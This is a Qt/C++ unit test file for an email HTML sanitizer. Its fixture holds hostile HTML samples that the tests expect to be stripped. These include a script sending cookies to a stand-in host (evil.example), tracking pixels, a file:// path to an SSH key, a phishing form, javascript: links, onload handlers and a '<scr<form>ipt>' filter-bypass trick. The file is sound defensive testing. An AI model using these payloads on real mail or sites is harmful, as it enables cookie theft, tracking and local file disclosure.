// Copyright (c) 2026 Randy Northrup. All rights reserved.
// SPDX-License-Identifier: AGPL-3.0-or-later

#include "sak/email_html_sanitizer.h"

#include <QtTest/QtTest>

using sak::emailResourceIsAllowed;
using sak::sanitizeEmailBodyHtml;

namespace {

// A realistic HTML mail: a marketing-style message that mixes ordinary formatting a technician
// must still be able to read with every active-content trick a hostile sender would use. The
// tests below assert on THIS body, so the behaviour change is visible rather than silent.
QString hostileNewsletter() {
    return QStringLiteral(
        "<html><head>"
        "<meta http-equiv=\"refresh\" content=\"0;url=http://evil.example/go\">"
        "<link rel=\"stylesheet\" href=\"http://evil.example/track.css\">"
        "<style>body { background: url('http://evil.example/bg.png'); "
        "width: expression(alert(1)); }</style>"
        "</head><body onload=\"steal()\">"
        "<h2 style=\"color:#0a5\">Quarterly Update</h2>"
        "<p>Hello <b>Randy</b>, here is the <i>summary</i>:</p>"
        "<ul><li>Item one</li><li>Item two</li></ul>"
        "<table border=\"1\"><tr><td>Region</td><td>Total</td></tr>"
        "<tr><td>North</td><td>42</td></tr></table>"
        "<script>fetch('http://evil.example/exfil?c='+document.cookie)</script>"
        "<img src=\"http://evil.example/beacon.gif\" width=\"1\" height=\"1\">"
        "<img src=\"file:///C:/Users/Username/.ssh/id_rsa\">"
        "<iframe src=\"http://evil.example/frame\"></iframe>"
        "<object data=\"http://evil.example/x.swf\"></object>"
        "<embed src=\"http://evil.example/x.swf\">"
        "<form action=\"http://evil.example/phish\"><input name=\"pw\"></form>"
        "<a href=\"javascript:evil()\">Click here</a>"
        "<a href=\"VBScript:evil()\">Or here</a>"
        "<div onmouseover='beacon()' onclick=steal>hover</div>"
        "</body></html>");
}

bool containsCi(const QString& haystack, const char* needle) {
    return haystack.contains(QLatin1String(needle), Qt::CaseInsensitive);
}

}  // namespace

class EmailHtmlSanitizerTests : public QObject {
    Q_OBJECT

private Q_SLOTS:
    void scriptBlockAndItsContentsAreRemoved();
    void framingAndLoadingTagsAreRemoved();
    void inlineEventHandlersAreRemoved();
    void scriptSchemeUrisAreNeutralized();
    void cssExpressionAndResourceUrlsAreNeutralized();
    void ordinaryFormattingSurvives();
    void sanitizerIsIdempotent();

    void slashDelimitedEventHandlerIsRemoved();
    void multiLineScriptBlockIsRemoved();
    void reassembledScriptTagIsRemoved();

    void resourcePolicyAllowsOnlyDataUris();
    void resourcePolicyDeniesLocalFileAndUnc();
    void resourcePolicyDeniesRemoteAndCid();
    void resourcePolicyDeniesRelativeAndEmpty();
};

void EmailHtmlSanitizerTests::scriptBlockAndItsContentsAreRemoved() {
    const QString clean = sanitizeEmailBodyHtml(hostileNewsletter());
    QVERIFY(!containsCi(clean, "<script"));
    // The body of the block must go too, not just its tags.
    QVERIFY(!containsCi(clean, "document.cookie"));
    QVERIFY(!containsCi(clean, "exfil"));
}

void EmailHtmlSanitizerTests::framingAndLoadingTagsAreRemoved() {
    const QString clean = sanitizeEmailBodyHtml(hostileNewsletter());
    for (const char* tag : {"<iframe", "<object", "<embed", "<form", "<link", "<meta"}) {
        QVERIFY2(!containsCi(clean, tag), tag);
    }
    // The <meta refresh> redirect and the remote stylesheet went with their tags.
    QVERIFY(!containsCi(clean, "http-equiv"));
    QVERIFY(!containsCi(clean, "track.css"));
}

void EmailHtmlSanitizerTests::inlineEventHandlersAreRemoved() {
    const QString clean = sanitizeEmailBodyHtml(hostileNewsletter());
    // Quoted, single-quoted, and bare-word handler forms all go.
    for (const char* handler : {"onload", "onmouseover", "onclick"}) {
        QVERIFY2(!containsCi(clean, handler), handler);
    }
    QVERIFY(!containsCi(clean, "steal()"));
    QVERIFY(!containsCi(clean, "beacon()"));
}

void EmailHtmlSanitizerTests::scriptSchemeUrisAreNeutralized() {
    const QString clean = sanitizeEmailBodyHtml(hostileNewsletter());
    QVERIFY(!containsCi(clean, "javascript:"));
    QVERIFY(!containsCi(clean, "vbscript:"));
    // Neutralized, not deleted: the anchor text stays readable as evidence.
    QVERIFY(clean.contains(QStringLiteral("Click here")));
    QVERIFY(clean.contains(QStringLiteral("blocked:")));
}

void EmailHtmlSanitizerTests::cssExpressionAndResourceUrlsAreNeutralized() {
    const QString clean = sanitizeEmailBodyHtml(hostileNewsletter());
    QVERIFY(!containsCi(clean, "expression("));
    QVERIFY(!containsCi(clean, "bg.png"));
    QVERIFY(!containsCi(clean, "url("));

    // A data: url() is self-contained and must survive, or inline images break.
    const QString inline_css = QStringLiteral(
        "<div style=\"background: url(data:image/gif;base64,R0lGOD); color: red;\">x</div>");
    const QString kept = sanitizeEmailBodyHtml(inline_css);
    QVERIFY(kept.contains(QStringLiteral("url(data:image/gif;base64,R0lGOD)")));
    QVERIFY(kept.contains(QStringLiteral("color: red")));

    // file:// and relative url() are local-disclosure vectors, not formatting.
    QVERIFY(!containsCi(sanitizeEmailBodyHtml(
                            QStringLiteral("<p style=\"background:url(file:///C:/x.png)\">p</p>")),
                        "file://"));
    QVERIFY(
        !containsCi(sanitizeEmailBodyHtml(QStringLiteral("<style>@import url(evil.css);</style>")),
                    "evil.css"));
}

void EmailHtmlSanitizerTests::ordinaryFormattingSurvives() {
    // The control: this is a message VIEWER, so the fix must not be "strip everything".
    const QString clean = sanitizeEmailBodyHtml(hostileNewsletter());
    QVERIFY(clean.contains(QStringLiteral("<b>Randy</b>")));
    QVERIFY(clean.contains(QStringLiteral("<i>summary</i>")));
    QVERIFY(clean.contains(QStringLiteral("<ul>")));
    QVERIFY(clean.contains(QStringLiteral("<li>Item one</li>")));
    QVERIFY(clean.contains(QStringLiteral("<table")));
    QVERIFY(clean.contains(QStringLiteral("<td>North</td>")));
    QVERIFY(clean.contains(QStringLiteral("color:#0a5")));
    QVERIFY(clean.contains(QStringLiteral("Quarterly Update")));
}

void EmailHtmlSanitizerTests::sanitizerIsIdempotent() {
    // buildPreviewHtml() sanitizes at one choke point that several paths funnel through; running
    // the sanitizer twice must not corrupt an already-clean body.
    const QString once = sanitizeEmailBodyHtml(hostileNewsletter());
    QCOMPARE(sanitizeEmailBodyHtml(once), once);
}

void EmailHtmlSanitizerTests::slashDelimitedEventHandlerIsRemoved() {
    // HTML5 accepts a solidus as an attribute separator, so "<svg/onload=...>" is a live handler
    // with no whitespace before `on`. The [\s/] boundary in the handler pattern is what catches it;
    // a whitespace-only boundary would let this through. Pin the solidus form independently.
    const QString clean = sanitizeEmailBodyHtml(QStringLiteral("<svg/onload=alert(1)>x</svg>"));
    QVERIFY(!containsCi(clean, "onload"));
    QVERIFY(!containsCi(clean, "alert(1)"));
    QVERIFY(clean.contains(QStringLiteral("x")));  // benign content survives
}

void EmailHtmlSanitizerTests::multiLineScriptBlockIsRemoved() {
    // A hostile <script> body routinely spans newlines. Removing the block's contents requires the
    // dot to match newlines (DotMatchesEverythingOption); without it only the bare tags go and the
    // script source survives as visible text. Pin the multi-line body, not just the single-line
    // one.
    const QString clean =
        sanitizeEmailBodyHtml(QStringLiteral("<p>hi</p><script>\n  var beacon = 'exfil-marker';\n  "
                                             "fetch(beacon);\n</script><p>bye</p>"));
    QVERIFY(!containsCi(clean, "<script"));
    QVERIFY(!containsCi(clean, "exfil-marker"));
    QVERIFY(!containsCi(clean, "fetch"));
    QVERIFY(clean.contains(QStringLiteral("<p>hi</p>")));
    QVERIFY(clean.contains(QStringLiteral("<p>bye</p>")));
}

void EmailHtmlSanitizerTests::reassembledScriptTagIsRemoved() {
    // Stripping one danger tag can splice two fragments into a fresh <script> the single forward
    // scan already walked past: removing <form> from "<scr<form>ipt>" yields "<script>". Only the
    // multi-pass loop catches the reassembled tag on a later pass; a one-pass sanitizer leaves it.
    const QString clean =
        sanitizeEmailBodyHtml(QStringLiteral("<scr<form>ipt>alert(1)</script>tail"));
    // The defense targets the reformed <script> TAG: pass 1 strips <form> (and the closing
    // </script>) leaving "<script>alert(1)tail", pass 2 strips that reopened tag. A one-pass
    // sanitizer stops after pass 1 with the live <script> still present -- so pin the tag, not the
    // now-inert "alert(1)" body text that legitimately survives once no tag wraps it.
    QVERIFY(!containsCi(clean, "<script"));
    QVERIFY(clean.contains(QStringLiteral("tail")));
}

void EmailHtmlSanitizerTests::resourcePolicyAllowsOnlyDataUris() {
    // data: is self-contained -- it is what the inspector rewrites cid:/downloaded images into,
    // so allowing it is what keeps inline images working.
    QVERIFY(emailResourceIsAllowed(QUrl(QStringLiteral("data:image/png;base64,iVBORw0KGgo="))));
    QVERIFY(emailResourceIsAllowed(QUrl(QStringLiteral("DATA:image/gif;base64,R0lGOD"))));
}

void EmailHtmlSanitizerTests::resourcePolicyDeniesLocalFileAndUnc() {
    // The disclosure vector: QTextBrowser would otherwise read these off the technician's machine
    // and hand the bytes to the rendered document.
    QVERIFY(!emailResourceIsAllowed(QUrl(QStringLiteral("file:///C:/Users/Username/.ssh/id_rsa"))));
    QVERIFY(!emailResourceIsAllowed(QUrl(QStringLiteral("file://server/share/secret.png"))));
    QVERIFY(!emailResourceIsAllowed(QUrl(QStringLiteral("qrc:/icons/x.svg"))));
}

void EmailHtmlSanitizerTests::resourcePolicyDeniesRemoteAndCid() {
    // The tracking-pixel vector.
    QVERIFY(!emailResourceIsAllowed(QUrl(QStringLiteral("http://evil.example/beacon.gif"))));
    QVERIFY(!emailResourceIsAllowed(QUrl(QStringLiteral("https://evil.example/beacon.gif"))));
    QVERIFY(!emailResourceIsAllowed(QUrl(QStringLiteral("ftp://evil.example/x"))));
    // cid: is resolved into a data: URI before rendering; the raw form is never loaded.
    QVERIFY(!emailResourceIsAllowed(QUrl(QStringLiteral("cid:image001@01D9"))));
}

void EmailHtmlSanitizerTests::resourcePolicyDeniesRelativeAndEmpty() {
    // Fail closed: no scheme means it would resolve against the document base, so refuse it.
    QVERIFY(!emailResourceIsAllowed(QUrl(QStringLiteral("beacon.gif"))));
    QVERIFY(!emailResourceIsAllowed(QUrl(QStringLiteral("../../secret.png"))));
    QVERIFY(!emailResourceIsAllowed(QUrl(QStringLiteral("//evil.example/beacon.gif"))));
    QVERIFY(!emailResourceIsAllowed(QUrl()));
}

QTEST_GUILESS_MAIN(EmailHtmlSanitizerTests)
#include "test_email_html_sanitizer.moc"
